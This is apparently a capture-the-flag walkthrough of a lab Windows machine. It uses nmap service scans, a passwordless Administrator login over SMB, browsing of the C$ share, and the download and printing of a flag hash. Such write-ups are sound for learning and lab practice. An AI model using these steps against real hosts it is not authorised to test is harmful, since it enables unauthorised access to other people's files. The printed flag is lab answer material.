___
### 1. SMB Service Discovery
**Input**
```bash
nmap -sV -p 139,445 10.129.197.199
```

**Output**
```text
PORT    STATE SERVICE       VERSION
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows
```
**Result:** Windows host with SMB exposed on ports **139 and 445**.

### 2. SMB Protocol Enumeration

**Input**
```bash
nmap -p 445 --script smb-protocols 10.129.198.134
```

**Output**
```text
smb-protocols:
  dialects:
    2.0.2
    2.1
    3.0
    3.0.2
    3.1.1
```
**Result:** SMB 2.x/3.x supported. SMBv1 was not detected.

### 3. Administrator Authentication & Share Enumeration
The `Administrator` account had **no password configured**, so authentication was possible without a password.

**Input**
```bash
smbclient -L //10.129.198.134/ -U Administrator
```

**Output**
```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```
**Result:** Successfully authenticated as `Administrator` and enumerated the available SMB shares.

### 4. Access the C$ Administrative Share
**Input**
```bash
smbclient //10.129.198.134/C$ -U Administrator
```

**Output**
```text
Try "help" to get a list of possible commands.
smb: \>
```
**Result:** Obtained an interactive SMB session with access to the Windows `C:\` drive.

### 5. Enumerate the C:\ Drive
**Input**
```bash
smb: \> ls
```

**Output**
```text
$Recycle.Bin
Config.Msi
Documents and Settings
PerfLogs
Program Files
Program Files (x86)
ProgramData
Recovery
System Volume Information
Users
Windows
```
**Result:** The `C:\` filesystem was accessible. The `Users` directory was identified.

### 6. Enumerate Users
**Input**
```bash
smb: \> cd Users
smb: \Users\> ls
```

**Output**
```text
Administrator
All Users
Default
Default User
Public
```
**Result:** The `Administrator` profile was accessible.

### 7. Enumerate Administrator's Desktop
**Input**
```bash
smb: \Users\> cd Administrator
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> ls
```

**Output**
```text
desktop.ini
flag.txt
```
**Result:** `flag.txt` was found on the Administrator's Desktop.

### 8. Download the Flag
**Input**
```bash
smb: \Users\Administrator\Desktop\> get flag.txt
```

**Output**
```text
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt
```
**Result:** `flag.txt` was downloaded to the Kali machine.

### 9. Read the Flag
**Input**
```bash
cat flag.txt
```

**Output**
```text
f751c19eda8f61ce81827e6930a1f40c
```